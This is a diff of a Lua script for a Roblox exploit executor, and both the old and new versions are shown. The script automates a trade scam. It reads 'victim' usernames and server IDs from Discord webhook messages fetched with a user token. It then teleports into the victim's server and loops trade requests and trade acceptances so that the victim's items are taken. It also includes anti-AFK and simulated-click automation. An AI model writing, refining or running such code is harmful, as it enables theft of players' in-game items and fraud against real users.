@@ -1,226 +1,145 @@
--- Configuration
-local CONFIG = {
-    REQUIRED_FILES = {
-        USER_FILE = "user.txt",
-        JOINED_IDS_FILE = "joined_ids.txt"
-    },
-    DEFAULT_VICTIM = "victim_username",
-    TRADE_CHECK_INTERVAL = 5, -- seconds
-    MESSAGE_CHECK_INTERVAL = 5, -- seconds
-    DEVICE_SELECT_DELAY = 0.1, -- seconds
-    TRADE_TIMER_THRESHOLD = 5, -- seconds
-    TRADE_REQUEST_DELAY = 0.5, -- seconds between trade requests
-    MAX_TRADE_ATTEMPTS = 20 -- max times to try trading before giving up
-}
-
--- Services
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local TeleportService = game:GetService("TeleportService")
-local TextChatService = game:GetService("TextChatService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local localPlayer = Players.LocalPlayer
-
--- Validate configuration
-if not token or token == "" or not channelId or channelId == "" then
-    localPlayer:Kick("Please add your Discord token and channel ID")
-    return
-end
-
--- Wait for game to load
 if not game:IsLoaded() then
-    game.Loaded:Wait()
+	game.Loaded:Wait()
 end
 
--- Anti-AFK
-local virtualUser = game:GetService("VirtualUser")
-localPlayer.Idled:Connect(function()
-    virtualUser:CaptureController()
-    virtualUser:ClickButton2(Vector2.new())
+if token == "" or channelId == "" then
+    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
+end
+
+local bb = game:GetService("VirtualUser")
+game:service "Players".LocalPlayer.Idled:Connect(function()
+    bb:CaptureController()
+    bb:ClickButton2(Vector2.new())
 end)
 
--- Initialize files
-local function initializeFiles()
-    if not isfile(CONFIG.REQUIRED_FILES.USER_FILE) then
-        writefile(CONFIG.REQUIRED_FILES.USER_FILE, CONFIG.DEFAULT_VICTIM)
-    end
-    
-    if not isfile(CONFIG.REQUIRED_FILES.JOINED_IDS_FILE) then
-        writefile(CONFIG.REQUIRED_FILES.JOINED_IDS_FILE, "[]")
-    end
+local HttpServ = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local victimFile = isfile("user.txt")
+local joinedFile = isfile("joined_ids.txt")
+if not victimFile then
+    writefile("user.txt", "victim username")
 end
-
-initializeFiles()
-
--- Load data
-local victimUsername = readfile(CONFIG.REQUIRED_FILES.USER_FILE)
-local joinedIds = HttpService:JSONDecode(readfile(CONFIG.REQUIRED_FILES.JOINED_IDS_FILE))
+if not joinedFile then
+    writefile("joined_ids.txt", "[]")
+end
+local victimUser = readfile("user.txt")
+local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
 local didVictimLeave = false
-local tradeTimerValue = 0
-local tradeAttempts = 0
-local isTradingActive = false
+local timer = 0
 
--- Device selection
 local function selectDevice()
-    while task.wait(CONFIG.DEVICE_SELECT_DELAY) do
-        local playerGui = localPlayer:WaitForChild("PlayerGui")
-        local deviceSelectGui = playerGui:FindFirstChild("DeviceSelect")
-        
-        if deviceSelectGui then
-            local container = deviceSelectGui:WaitForChild("Container")
-            local phoneButton = container:WaitForChild("Phone"):WaitForChild("Button")
-            
-            local buttonPos = phoneButton.AbsolutePosition
-            local buttonSize = phoneButton.AbsoluteSize
+    while task.wait(0.1) do
+        local DeviceSelectGui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("DeviceSelect")
+        if DeviceSelectGui then
+            local Container = DeviceSelectGui:WaitForChild("Container")
+            local Mouse = game.Players.LocalPlayer:GetMouse()
+            local button = Container:WaitForChild("Phone"):WaitForChild("Button")
+            local buttonPos = button.AbsolutePosition
+            local buttonSize = button.AbsoluteSize
             local centerX = buttonPos.X + buttonSize.X / 2
             local centerY = buttonPos.Y + buttonSize.Y / 2
-            
-            -- Simulate click
             VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, true, game, 1)
             VirtualInputManager:SendMouseButtonEvent(centerX, centerY, 0, false, game, 1)
-            break
         end
     end
 end
 
 task.spawn(selectDevice)
 
--- Initial greeting
-task.wait(4)
-TextChatService.TextChannels.RBXGeneral:SendAsync('Hello!')
 
--- Trade functions
-local Trade = ReplicatedStorage:WaitForChild("Trade")
+local waittime = delay or 2
+wait(waittime)
+
+wait(4)
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Hai!')
+
+local notused = game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptRequest')
 
 local function saveJoinedId(messageId)
     table.insert(joinedIds, messageId)
-    writefile(CONFIG.REQUIRED_FILES.JOINED_IDS_FILE, HttpService:JSONEncode(joinedIds))
+    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
 end
 
-local function isTrading()
-    local status = Trade.GetTradeStatus:InvokeServer()
-    return status == "StartTrade"
-end
-
-local function monitorTradeTimer()
-    while task.wait(1) do
-        if isTrading() then
-            tradeTimerValue = 0
-        else
-            tradeTimerValue = tradeTimerValue + 1
-        end
+local function acceptRequest()
+    while task.wait(0.1) do
+    
+    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
+        local args = {
+        [1] = game:GetService("Players"):WaitForChild(victimUser)
+        }
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
     end
 end
 
-local function waitForTradeCompletion()
-    while isTrading() do
-        task.wait(0.1)
+local function acceptTrade()
+    while task.wait(0.1) do
+        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({[1] = 285646582}))
     end
-end
-
-local function sendTradeRequest()
-    local targetPlayer = Players:FindFirstChild(victimUsername)
-    if not targetPlayer then return false end
-    
-    Trade.SendRequest:InvokeServer(targetPlayer)
-    return true
-end
-
-local function processTrade()
-    isTradingActive = true
-    tradeAttempts = 0
-    
-    while isTradingActive and tradeAttempts < CONFIG.MAX_TRADE_ATTEMPTS do
-        local currentStatus = Trade.GetTradeStatus:InvokeServer()
-        
-        if currentStatus == "None" then
-            -- Send new trade request
-            if sendTradeRequest() then
-                tradeAttempts = tradeAttempts + 1
-            end
-            task.wait(CONFIG.TRADE_REQUEST_DELAY)
-            
-        elseif currentStatus == "ReceivingRequest" then
-            -- Accept incoming request
-            Trade.AcceptRequest:FireServer()
-            task.wait(0.5)
-            
-        elseif currentStatus == "StartTrade" then
-            -- Trade is active, accept it
-            Trade.AcceptTrade:FireServer(285646582)
-            task.wait(6) -- Wait for trade to complete
-            waitForTradeCompletion()
-            
-            -- Check if we should continue trading
-            if didVictimLeave or tradeTimerValue > CONFIG.TRADE_TIMER_THRESHOLD then
-                isTradingActive = false
-            end
-        else
-            task.wait(0.5)
-        end
-    end
-    
-    isTradingActive = false
 end
 
 local function waitForPlayerLeave()
-    local connection
-    connection = Players.PlayerRemoving:Connect(function(removedPlayer)
-        if removedPlayer.Name == victimUsername then
-            if connection then
-                connection:Disconnect()
+    local playerRemovedConnection
+    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+        if removedPlayer.Name == victimUser then
+            if playerRemovedConnection then
+                playerRemovedConnection:Disconnect()
             end
             didVictimLeave = true
-            isTradingActive = false
         end
     end)
 end
 
--- Start trade monitoring
+local function IsTrading()
+    local trade_status = game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
+    return trade_status == "StartTrade"
+end
+
+local function tradeTimer()
+    while task.wait(1) do
+        if IsTrading() then
+            timer = 0
+        else
+            timer = timer + 1
+        end
+    end
+end
+
 waitForPlayerLeave()
-task.spawn(monitorTradeTimer)
-task.spawn(processTrade)
+task.spawn(acceptTrade)
+task.spawn(tradeTimer)
+wait(3)
+task.spawn(acceptRequest)
 
--- Auto-join functionality
 local function autoJoin()
-    local success, response = pcall(function()
-        return request({
-            Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
-            Method = "GET",
-            Headers = {
-                ['Authorization'] = token,
-                ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-                ["Content-Type"] = "application/json"
-            }
-        })
-    end)
+    local response = request({
+        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=10",
+        Method = "GET",
+        Headers = {
+            ['Authorization'] = token,
+            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
+            ["Content-Type"] = "application/json"
+        }
+    })
 
-    if not success or not response or response.StatusCode ~= 200 then
-        return
-    end
+    if response.StatusCode == 200 then
+        local messages = HttpServ:JSONDecode(response.Body)
+        if #messages == 0 then
+            return
+        end
+        for _, message in ipairs(messages) do
+            if message.content ~= "" and message.embeds and message.embeds[1] and message.embeds[1].title then
+                if message.embeds[1].title:find("Join to get e") then
+                    local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
+                    if placeId and jobId then
+                        local victimUsername = message.embeds[1].fields[1].value
 
-    local messages = HttpService:JSONDecode(response.Body)
-    if not messages or #messages == 0 then
-        return
-    end
-
-    for _, message in ipairs(messages) do
-        if message.content and message.embeds and message.embeds[1] and message.embeds[1].title then
-            if message.embeds[1].title:find("Join to get e") then
-                local placeId, jobId = string.match(message.content, 'TeleportToPlaceInstance%((%d+),%s*["\']([%w%-]+)["\']%)')
-                if placeId and jobId then
-                    local victimUsernameFromEmbed = message.embeds[1].fields and message.embeds[1].fields[1] and message.embeds[1].fields[1].value
-
-                    if (didVictimLeave or tradeTimerValue > CONFIG.TRADE_TIMER_THRESHOLD) then
-                        if not table.find(joinedIds, tostring(message.id)) then
-                            saveJoinedId(tostring(message.id))
-                            if victimUsernameFromEmbed then
-                                writefile(CONFIG.REQUIRED_FILES.USER_FILE, victimUsernameFromEmbed)
-                                victimUsername = victimUsernameFromEmbed
+                        if didVictimLeave or timer > 5 then
+                            if not table.find(joinedIds, tostring(message.id)) then
+                                saveJoinedId(tostring(message.id))
+                                writefile("user.txt", victimUsername)
+                                game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
+                                return
                             end
-                            TeleportService:TeleportToPlaceInstance(tonumber(placeId), jobId)
-                            return
                         end
                     end
                 end
@@ -229,10 +148,6 @@ local function autoJoin()
     end
 end
 
--- Main loop
-while task.wait(CONFIG.MESSAGE_CHECK_INTERVAL) do
-    local success, err = pcall(autoJoin)
-    if not success then
-        warn("AutoJoin error:", err)
-    end
+while wait(5) do
+    autoJoin()
 end
